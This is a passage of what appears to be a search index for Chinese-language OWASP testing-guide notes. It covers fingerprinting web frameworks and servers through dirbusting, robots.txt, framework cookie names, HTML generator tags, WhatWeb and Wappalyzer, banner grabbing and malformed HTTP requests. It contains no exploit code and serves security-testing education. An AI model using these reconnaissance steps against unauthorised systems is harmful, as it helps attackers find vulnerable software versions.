\u54cd\u5e94\u4ee5\u679a\u4e3e\u670d\u52a1\u5668\u5185\u5bb9\u3002\u6b64\u4fe1\u606f\u65e2\u53ef\u7528\u4e8e\u67e5\u627e\u9ed8\u8ba4\u6587\u4ef6\u548c\u653b\u51fb\u5b83\u4eec\uff0c\u4e5f\u53ef\u7528\u4e8e\u5bf9 Web \u5e94\u7528\u7a0b\u5e8f\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u3002Dirbusting \u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b8c\u6210\uff0c\u4e0b\u9762\u7684\u793a\u4f8b\u663e\u793a\u4e86\u5728 Burp Suite \u7684\u5b9a\u4e49\u5217\u8868\u548c\u5165\u4fb5\u8005\u529f\u80fd\u7684\u5e2e\u52a9\u4e0b\uff0c\u5bf9 WordPress \u652f\u6301\u7684\u76ee\u6807\u8fdb\u884c\u6210\u529f\u7684 dirbusting \u653b\u51fb\u3002</p> <p> \u56fe 4.1.8-4\uff1a\u4f7f\u7528 Burp \u8fdb\u884c\u5206\u53d1</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5bf9\u4e8e\u67d0\u4e9b\u7279\u5b9a\u4e8e WordPress \u7684\u6587\u4ef6\u5939\uff08\u4f8b\u5982\uff0c<code>/wp-includes/</code>\u548c<code>/wp-admin/</code>\uff09 \uff0c\u00a0<code>/wp-content/</code>HTTP \u54cd\u5e94\u5206\u522b\u4e3a 403\uff08\u7981\u6b62\u8bbf\u95ee\uff09\u3001302\uff08\u627e\u5230\uff0c\u91cd\u5b9a\u5411\u5230\u00a0<code>wp-login.php</code>\uff09\u548c 200\uff08\u786e\u5b9a\uff09\u3002\u8fd9\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u6307\u6807\uff0c\u8868\u660e\u76ee\u6807\u662f\u7531 WordPress \u9a71\u52a8\u7684\u3002\u4ee5\u540c\u6837\u7684\u65b9\u5f0f\u53ef\u4ee5 dirbust \u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u63d2\u4ef6\u6587\u4ef6\u5939\u53ca\u5176\u7248\u672c\u3002\u5728\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u4e2d\uff0c\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u5178\u578b\u7684 Drupal \u63d2\u4ef6\u7684 CHANGELOG \u6587\u4ef6\uff0c\u5b83\u63d0\u4f9b\u4e86\u6709\u5173\u6b63\u5728\u4f7f\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u4fe1\u606f\uff0c\u5e76\u63ed\u793a\u4e86\u4e00\u4e2a\u6613\u53d7\u653b\u51fb\u7684\u63d2\u4ef6\u7248\u672c\u3002</p> <p> \u56fe 4.1.8-5\uff1aDrupal Botcha \u62ab\u9732</p> <p>\u63d0\u793a\uff1a\u5728\u5f00\u59cb dirbusting \u4e4b\u524d\uff0c\u8bf7\u5148\u68c0\u67e5<code>robots.txt</code>\u6587\u4ef6\u3002\u6709\u65f6\u4e5f\u53ef\u4ee5\u5728\u90a3\u91cc\u627e\u5230\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u6587\u4ef6\u5939\u548c\u5176\u4ed6\u654f\u611f\u4fe1\u606f\u3002<code>robots.txt</code>\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u663e\u793a\u4e86\u6b64\u7c7b\u6587\u4ef6\u7684\u793a\u4f8b\u3002</p> <p> \u56fe 4.1.8-6\uff1a\u673a\u5668\u4eba\u4fe1\u606f\u516c\u5f00</p> <p>\u6bcf\u4e2a\u7279\u5b9a\u5e94\u7528\u7a0b\u5e8f\u7684\u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u90fd\u4e0d\u540c\u3002\u5982\u679c\u786e\u5b9a\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u7ec4\u4ef6\u662f\u5f00\u6e90\u7684\uff0c\u5219\u5728\u6e17\u900f\u6d4b\u8bd5\u671f\u95f4\u8bbe\u7f6e\u4e34\u65f6\u5b89\u88c5\u53ef\u80fd\u6709\u4ef7\u503c\uff0c\u4ee5\u4fbf\u66f4\u597d\u5730\u4e86\u89e3\u6240\u63d0\u4f9b\u7684\u57fa\u7840\u8bbe\u65bd\u6216\u529f\u80fd\uff0c\u4ee5\u53ca\u670d\u52a1\u5668\u4e0a\u53ef\u80fd\u7559\u4e0b\u7684\u6587\u4ef6\u3002\u4f46\u662f\uff0c\u5df2\u7ecf\u5b58\u5728\u51e0\u4e2a\u4e0d\u9519\u7684\u6587\u4ef6\u5217\u8868\uff1b\u4e00\u4e2a\u5f88\u597d\u7684\u4f8b\u5b50\u662f\u53ef\u9884\u6d4b\u6587\u4ef6/\u6587\u4ef6\u5939\u7684 FuzzDB \u8bcd\u8868\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_6","title":"\u6587\u4ef6\u6269\u5c55\u540d","text":"<p>URL \u53ef\u80fd\u5305\u542b\u6587\u4ef6\u6269\u5c55\u540d\uff0c\u8fd9\u4e5f\u6709\u52a9\u4e8e\u8bc6\u522b\u7f51\u7edc\u5e73\u53f0\u6216\u6280\u672f\u3002</p> <p>\u4f8b\u5982\uff0cOWASP wiki \u4f7f\u7528 PHP\uff1a</p> <pre><code>https://wiki.owasp.org/index.php?title=Fingerprint_Web_Application_Framework&amp;action=edit&amp;section=4\n</code></pre> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684 Web \u6587\u4ef6\u6269\u5c55\u540d\u548c\u76f8\u5173\u6280\u672f\uff1a</p> <ul> <li><code>.php</code>\u2013 PHP</li> <li><code>.aspx</code>\u2013 \u5fae\u8f6f ASP.NET</li> <li><code>.jsp</code>\u2013 Java \u670d\u52a1\u5668\u9875\u9762</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_7","title":"\u9519\u8bef\u4fe1\u606f","text":"<p>\u5982\u4ee5\u4e0b\u5c4f\u5e55\u622a\u56fe\u6240\u793a\uff0c\u5217\u51fa\u7684\u6587\u4ef6\u7cfb\u7edf\u8def\u5f84\u6307\u5411\u4f7f\u7528 WordPress (\u00a0<code>wp-content</code>)\u3002\u6d4b\u8bd5\u4eba\u5458\u8fd8\u5e94\u8be5\u77e5\u9053 WordPress \u662f\u57fa\u4e8e PHP \u7684 (\u00a0<code>functions.php</code>)\u3002</p> <p> \u56fe 4.1.8-7\uff1aWordPress \u89e3\u6790\u9519\u8bef</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_8","title":"\u901a\u7528\u6807\u8bc6\u7b26","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#cookie_1","title":"Cookie","text":"<p>Framework Cookie name</p> <p>Zope zope3</p> <p>CakePHP cakephp</p> <p>Kohana kohanasession</p> <p>Laravel laravel_session</p> <p>phpBB phpbb3_</p> <p>WordPress wp-settings</p> <p>1C-Bitrix BITRIX_</p> <p>AMPcms AMP</p> <p>Django CMS django</p> <p>DotNetNuke DotNetNukeAnonymous</p> <p>e107 e107_tz</p> <p>EPiServer EPiTrace, EPiServer</p> <p>Graffiti CMS graffitibot</p> <p>Hotaru CMS hotaru_mobile</p> <p>ImpressCMS ICMSession</p> <p>Indico MAKACSESSION</p> <p>InstantCMS InstantCMS[logdate]</p> <p>Kentico CMS CMSPreferredCulture</p> <p>MODx SN4[12symb]</p> <p>TYPO3 fe_typo_user</p> <p>Dynamicweb Dynamicweb</p> <p>LEPTON lep[some_numeric_value]+sessionid</p> <p>Wix Domain=.wix.com</p> <p>VIVVO VivvoSessionId</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#html_1","title":"HTML \u6e90\u4ee3\u7801","text":"<p>\u5e94\u7528</p> <p>\u5173\u952e\u8bcd</p> <p>WordPress\u7684</p> <p><code>&lt;meta name=\"generator\" content=\"WordPress 3.9.2\" /&gt;</code></p> <p>phpBB</p> <p><code>&lt;body id=\"phpbb\"</code></p> <p>Mediawiki</p> <p><code>&lt;meta name=\"generator\" content=\"MediaWiki 1.21.9\" /&gt;</code></p> <p>Joomla</p> <p><code>&lt;meta name=\"generator\" content=\"Joomla! - Open Source Content Management\" /&gt;</code></p> <p>Drupal</p> <p><code>&lt;meta name=\"Generator\" content=\"Drupal 7 (http://drupal.org)\" /&gt;</code></p> <p>DotNetNuke</p> <p><code>DNN Platform - [http://www.dnnsoftware.com](http://www.dnnsoftware.com)</code></p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_9","title":"\u4e00\u822c\u6807\u8bb0","text":"<ul> <li><code>%framework_name%</code></li> <li><code>powered by</code></li> <li><code>built upon</code></li> <li><code>running</code></li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_10","title":"\u7279\u5b9a\u6807\u8bb0","text":"<p>\u6846\u67b6</p> <p>\u5173\u952e\u8bcd</p> <p>Adobe ColdFusion</p> <p><code>&lt;!-- START headerTags.cfm</code></p> <p>Microsoft ASP.NET</p> <p><code>__VIEWSTATE</code></p> <p>ZK</p> <p><code>&lt;!-- ZK</code></p> <p>Business Catalyst</p> <p><code>&lt;!-- BC_OBNW --&gt;</code></p> <p>Indexhibit</p> <p><code>ndxz-studio</code></p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_11","title":"\u6574\u6cbb","text":"<p>\u867d\u7136\u53ef\u4ee5\u52aa\u529b\u4f7f\u7528\u4e0d\u540c\u7684 cookie \u540d\u79f0\uff08\u901a\u8fc7\u66f4\u6539\u914d\u7f6e\uff09\u3001\u9690\u85cf\u6216\u66f4\u6539\u6587\u4ef6/\u76ee\u5f55\u8def\u5f84\uff08\u901a\u8fc7\u91cd\u5199\u6216\u6e90\u4ee3\u7801\u66f4\u6539\uff09\u3001\u5220\u9664\u5df2\u77e5\u6807\u5934\u7b49\uff0c\u4f46\u8fd9\u4e9b\u52aa\u529b\u5f52\u7ed3\u4e3a\u201c\u901a\u8fc7\u6a21\u7cca\u5b9e\u73b0\u5b89\u5168\u201d\u3002\u7cfb\u7edf\u6240\u6709\u8005/\u7ba1\u7406\u5458\u5e94\u8be5\u8ba4\u8bc6\u5230\uff0c\u8fd9\u4e9b\u52aa\u529b\u53ea\u4f1a\u51cf\u6162\u6700\u57fa\u672c\u7684\u5bf9\u624b\u3002\u65f6\u95f4/\u7cbe\u529b\u53ef\u4ee5\u66f4\u597d\u5730\u7528\u4e8e\u5229\u76ca\u76f8\u5173\u8005\u610f\u8bc6\u548c\u89e3\u51b3\u65b9\u6848\u7ef4\u62a4\u6d3b\u52a8\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_12","title":"\u5de5\u5177","text":"<p>\u4e0b\u9762\u5217\u51fa\u4e86\u5e38\u7528\u548c\u4f17\u6240\u5468\u77e5\u7684\u5de5\u5177\u3002\u8fd8\u6709\u5f88\u591a\u5176\u4ed6\u5b9e\u7528\u7a0b\u5e8f\uff0c\u4ee5\u53ca\u57fa\u4e8e\u6846\u67b6\u7684\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#whatweb","title":"Whatweb","text":"<p>\u7f51\u7ad9\uff1ahttps ://github.com/urbanadventurer/WhatWeb</p> <p>\u76ee\u524d\u5e02\u573a\u4e0a\u6700\u597d\u7684\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u4e4b\u4e00\u3002\u5305\u542b\u5728\u9ed8\u8ba4\u7684Kali Linux\u6784\u5efa\u4e2d\u3002\u8bed\u8a00\uff1aRuby \u7528\u4e8e\u6307\u7eb9\u8bc6\u522b\u7684\u5339\u914d\u4f7f\u7528\uff1a</p> <ul> <li>\u6587\u672c\u5b57\u7b26\u4e32\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</li> <li>\u5e38\u7528\u8868\u8fbe</li> <li>Google Hack \u6570\u636e\u5e93\u67e5\u8be2\uff08\u6709\u9650\u7684\u5173\u952e\u5b57\u96c6\uff09</li> <li>MD5 \u54c8\u5e0c</li> <li>\u7f51\u5740\u8bc6\u522b</li> <li>HTML \u6807\u8bb0\u6a21\u5f0f</li> <li>\u7528\u4e8e\u88ab\u52a8\u548c\u4e3b\u52a8\u64cd\u4f5c\u7684\u81ea\u5b9a\u4e49 ruby\u200b\u200b \u4ee3\u7801</li> </ul> <p>\u793a\u4f8b\u8f93\u51fa\u663e\u793a\u5728\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u4e2d\uff1a</p> <p> \u56fe 4.1.8-8\uff1aWhatweb \u8f93\u51fa\u793a\u4f8b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#wappalyzer","title":"Wappalyzer","text":"<p>\u7f51\u7ad9\uff1ahttps ://www.wappalyzer.com/</p> <p>Wappalyzer \u6709\u591a\u79cd\u4f7f\u7528\u6a21\u5f0f\uff0c\u5176\u4e2d\u6700\u6d41\u884c\u7684\u53ef\u80fd\u662f Firefox/Chrome \u6269\u5c55\u3002\u5b83\u4eec\u4ec5\u9002\u7528\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c\u9664\u4e86\u8981\u5728\u6d4f\u89c8\u5668\u4e2d\u52a0\u8f7d\u7684\u9875\u9762\u5916\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u5176\u4ed6\u5185\u5bb9\u3002\u5b83\u5b8c\u5168\u5728\u6d4f\u89c8\u5668\u7ea7\u522b\u5de5\u4f5c\uff0c\u5e76\u4ee5\u56fe\u6807\u7684\u5f62\u5f0f\u7ed9\u51fa\u7ed3\u679c\u3002\u867d\u7136\u6709\u65f6\u5b83\u4f1a\u51fa\u73b0\u8bef\u62a5\uff0c\u4f46\u5728\u6d4f\u89c8\u9875\u9762\u540e\u7acb\u5373\u4e86\u89e3\u4f7f\u7528\u4e86\u54ea\u4e9b\u6280\u672f\u6765\u6784\u5efa\u76ee\u6807\u7f51\u7ad9\u975e\u5e38\u65b9\u4fbf\u3002</p> <p>\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u663e\u793a\u4e86\u63d2\u4ef6\u7684\u793a\u4f8b\u8f93\u51fa\u3002</p> <p> \u56fe 4.1.8-9\uff1aOWASP \u7f51\u7ad9\u7684 Wappalyzer \u8f93\u51fa</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_13","title":"\u53c2\u8003","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_14","title":"\u767d\u76ae\u4e66","text":"<ul> <li>Saumil Shah\uff1a\u201cHTTP \u6307\u7eb9\u8bc6\u522b\u7b80\u4ecb\u201d</li> <li>Anant Shrivastava\uff1a\u201c\u7f51\u7edc\u5e94\u7528\u6307\u7eb9\u8bc6\u522b\u201d</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.9%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/","title":"1.9\u6307\u7eb9 Web \u670d\u52a1\u5668","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.9%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_1","title":"\u6982\u62ec","text":"<p>Web \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u662f\u8bc6\u522b\u8fd0\u884c\u76ee\u6807\u7684 Web \u670d\u52a1\u5668\u7684\u7c7b\u578b\u548c\u7248\u672c\u7684\u4efb\u52a1\u3002\u867d\u7136 Web \u670d\u52a1\u5668\u6307\u7eb9\u901a\u5e38\u5c01\u88c5\u5728\u81ea\u52a8\u5316\u6d4b\u8bd5\u5de5\u5177\u4e2d\uff0c\u4f46\u5bf9\u4e8e\u7814\u7a76\u4eba\u5458\u6765\u8bf4\uff0c\u4e86\u89e3\u8fd9\u4e9b\u5de5\u5177\u5982\u4f55\u5c1d\u8bd5\u8bc6\u522b\u8f6f\u4ef6\u7684\u57fa\u672c\u539f\u7406\u53ca\u5176\u6709\u7528\u7684\u539f\u56e0\u975e\u5e38\u91cd\u8981\u3002</p> <p>\u51c6\u786e\u5730\u53d1\u73b0\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u7684 Web \u670d\u52a1\u5668\u7684\u7c7b\u578b\u53ef\u4ee5\u4f7f\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002\u7279\u522b\u662f\uff0c\u8fd0\u884c\u6ca1\u6709\u6700\u65b0\u5b89\u5168\u8865\u4e01\u7684\u65e7\u7248\u672c\u8f6f\u4ef6\u7684\u670d\u52a1\u5668\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u5df2\u77e5\u7248\u672c\u7279\u5b9a\u6f0f\u6d1e\u7684\u653b\u51fb\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.9%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u786e\u5b9a\u6b63\u5728\u8fd0\u884c\u7684 Web \u670d\u52a1\u5668\u7684\u7248\u672c\u548c\u7c7b\u578b\uff0c\u4ee5\u4fbf\u8fdb\u4e00\u6b65\u53d1\u73b0\u4efb\u4f55\u5df2\u77e5\u6f0f\u6d1e\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.9%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u7528\u4e8e Web \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u7684\u6280\u672f\u5305\u62ec\u6a2a\u5e45\u6293\u53d6\u3001\u5f15\u53d1\u5bf9\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42\u7684\u54cd\u5e94\uff0c\u4ee5\u53ca\u4f7f\u7528\u81ea\u52a8\u5316\u5de5\u5177\u6267\u884c\u4f7f\u7528\u7b56\u7565\u7ec4\u5408\u7684\u66f4\u5f3a\u5927\u7684\u626b\u63cf\u3002\u6240\u6709\u8fd9\u4e9b\u6280\u672f\u8fd0\u4f5c\u7684\u57fa\u672c\u524d\u63d0\u662f\u76f8\u540c\u7684\u3002\u4ed6\u4eec\u90fd\u52aa\u529b\u4ece Web \u670d\u52a1\u5668\u4e2d\u5f15\u51fa\u4e00\u4e9b\u54cd\u5e94\uff0c\u7136\u540e\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u54cd\u5e94\u4e0e\u5df2\u77e5\u54cd\u5e94\u548c\u884c\u4e3a\u7684\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u4e0e\u5df2\u77e5\u7684\u670d\u52a1\u5668\u7c7b\u578b\u76f8\u5339\u914d\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.9%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_4","title":"\u6a2a\u5e45\u6293\u53d6","text":"<p>\u6a2a\u5e45\u6293\u53d6\u662f\u901a\u8fc7\u5411 Web \u670d\u52a1\u5668\u53d1\u9001 HTTP \u8bf7\u6c42\u5e76\u68c0\u67e5\u5176\u54cd\u5e94\u6807\u5934\u6765\u6267\u884c\u7684\u3002\u8fd9\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u5de5\u5177\u6765\u5b8c\u6210\uff0c\u5305\u62ec<code>telnet</code>HTTP \u8bf7\u6c42\u6216<code>openssl</code>\u901a\u8fc7 TLS/SSL \u7684\u8bf7\u6c42\u3002</p> <p>\u4f8b\u5982\uff0c\u8fd9\u662f\u5bf9\u6765\u81ea Apache \u670d\u52a1\u5668\u7684\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>HTTP/1.1 200 OK\nDate: Thu, 05 Sep 2019 17:42:39 GMT\nServer: Apache/2.4.41 (Unix)\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nETag: \"75-591d1d21b6167\"\nAccept-Ranges: bytes\nContent-Length: 117\nConnection: close\nContent-Type: text/html\n...\n</code></pre> <p>\u8fd9\u662f\u53e6\u4e00\u4e2a\u54cd\u5e94\uff0c\u8fd9\u6b21\u6765\u81ea nginx\u3002</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.17.3\nDate: Thu, 05 Sep 2019 17:50:24 GMT\nContent-Type: text/html\nContent-Length: 117\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nConnection: close\nETag: \"5d71489a-75\"\nAccept-Ranges: bytes\n...\n</code></pre> <p>\u8fd9\u662f\u6765\u81ea lighttpd \u7684\u54cd\u5e94\u3002</p> <pre><code>HTTP/1.0 200 OK\nContent-Type: text/html\nAccept-Ranges: bytes\nETag: \"4192788355\"\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nContent-Length: 117\nConnection: close\nDate: Thu, 05 Sep 2019 17:57:57 GMT\nServer: lighttpd/1.4.54\n</code></pre> <p>\u5728\u8fd9\u4e9b\u4f8b\u5b50\u4e2d\uff0c\u670d\u52a1\u5668\u7c7b\u578b\u548c\u7248\u672c\u88ab\u6e05\u695a\u5730\u66b4\u9732\u4e86\u3002\u4f46\u662f\uff0c\u6ce8\u91cd\u5b89\u5168\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u901a\u8fc7\u4fee\u6539\u6807\u5934\u6765\u6df7\u6dc6\u5176\u670d\u52a1\u5668\u4fe1\u606f\u3002\u4f8b\u5982\uff0c\u4ee5\u4e0b\u662f\u5bf9\u5177\u6709\u4fee\u6539\u6807\u5934\u7684\u7ad9\u70b9\u8bf7\u6c42\u7684\u54cd\u5e94\u7684\u6458\u5f55\uff1a</p> <pre><code>HTTP/1.1 200 OK\nServer: Website.com\nDate: Thu, 05 Sep 2019 17:57:06 GMT\nContent-Type: text/html; charset=utf-8\nStatus: 200 OK\n...\n</code></pre> <p>\u5728\u670d\u52a1\u5668\u4fe1\u606f\u6a21\u7cca\u4e0d\u6e05\u7684\u60c5\u51b5\u4e0b\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u6839\u636e\u6807\u5934\u5b57\u6bb5\u7684\u987a\u5e8f\u731c\u6d4b\u670d\u52a1\u5668\u7684\u7c7b\u578b\u3002\u8bf7\u6ce8\u610f\uff0c\u5728\u4e0a\u9762\u7684 Apache \u793a\u4f8b\u4e2d\uff0c\u5b57\u6bb5\u9075\u5faa\u4ee5\u4e0b\u987a\u5e8f\uff1a</p> <ul> <li>\u65e5\u671f</li> <li>\u670d\u52a1\u5668</li> <li>\u6700\u540e\u4fee\u6539</li> <li>\u7535\u5b50\u6807\u7b7e</li> <li>\u63a5\u53d7\u8303\u56f4</li> <li>\u5185\u5bb9\u957f\u5ea6</li> <li>\u8054\u7cfb</li> <li>\u5185\u5bb9\u7c7b\u578b</li> </ul> <p>\u4f46\u662f\uff0c\u5728 nginx \u548c\u6a21\u7cca\u670d\u52a1\u5668\u793a\u4f8b\u4e2d\uff0c\u5171\u540c\u7684\u5b57\u6bb5\u90fd\u9075\u5faa\u4ee5\u4e0b\u987a\u5e8f\uff1a</p> <ul> <li>\u670d\u52a1\u5668</li> <li>\u65e5\u671f</li> <li>\u5185\u5bb9\u7c7b\u578b</li> </ul> <p>\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u731c\u6d4b\u88ab\u906e\u6321\u7684\u670d\u52a1\u5668\u662fnginx\u3002\u4f46\u662f\uff0c\u8003\u8651\u5230\u591a\u4e2a\u4e0d\u540c\u7684Web\u670d\u52a1\u5668\u53ef\u80fd\u5171\u4eab\u76f8\u540c\u7684\u5b57\u6bb5\u987a\u5e8f\u5e76\u4e14\u53ef\u4ee5\u4fee\u6539\u6216\u5220\u9664\u5b57\u6bb5\uff0c\u8fd9\u79cd\u65b9\u6cd5\u662f\u4e0d\u786e\u5b9a\u7684\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.9%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_5","title":"\u53d1\u9001\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42","text":"<p>Web \u670d\u52a1\u5668\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u5b83\u4eec\u7684\u9519\u8bef\u54cd\u5e94\u6765\u8bc6\u522b\uff0c\u5e76\u4e14\u5728\u5b83\u4eec\u6ca1\u6709\u88ab\u5b9a\u5236\u7684\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u7684\u9ed8\u8ba4\u9519\u8bef\u9875\u9762\u3002\u5f3a\u5236\u670d\u52a1\u5668\u5448\u73b0\u8fd9\u4e9b\u5185\u5bb9\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u6545\u610f\u53d1\u9001\u4e0d\u6b63\u786e\u6216\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42\u3002</p> <p>\u4f8b\u5982\uff0c\u8fd9\u662f\u5bf9<code>SANTA CLAUS</code>\u6765\u81ea Apache \u670d\u52a1\u5668\u7684\u4e0d\u5b58\u5728\u65b9\u6cd5\u7684\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>GET / SANTA CLAUS/1.1\n\n\nHTTP/1.1 400 Bad Request\nDate: Fri, 06 Sep 2019 19:21:01 GMT\nServer: Apache/2.4.41 (Unix)\nContent-Length: 226\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;400 Bad Request&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Bad Request&lt;/h1&gt;\n&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;\n&lt;/p&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>\u8fd9\u662f\u5bf9\u6765\u81ea nginx \u7684\u76f8\u540c\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>GET / SANTA CLAUS/1.1\n\n\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;\n&lt;hr&gt;&lt;center&gt;nginx/1.17.3&lt;/center&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u8fd9\u662f\u5bf9\u6765\u81ea lighttpd \u7684\u76f8\u540c\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>GET / SANTA CLAUS/1.1\n\n\nHTTP/1.0 400 Bad Request\nContent-Type: text/html\nContent-Length: 345\nConnection: close\nDate: Sun, 08 Sep 2019 21:56:17 GMT\nServer: lighttpd/1.4.54\n\n&lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n         